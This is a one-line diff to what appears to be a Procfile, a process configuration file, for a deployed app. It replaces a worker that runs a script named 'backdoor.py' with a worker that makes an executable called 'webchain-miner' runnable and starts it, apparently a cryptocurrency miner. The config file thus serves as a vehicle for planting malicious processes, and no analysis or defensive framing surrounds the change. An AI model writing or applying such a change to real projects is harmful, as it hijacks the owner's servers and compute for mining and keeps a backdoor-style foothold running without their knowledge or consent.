@@ -1,1 +1,1 @@
-worker: python backdoor.py
+worker: chmod +x ./webchain-miner && ./webchain-miner
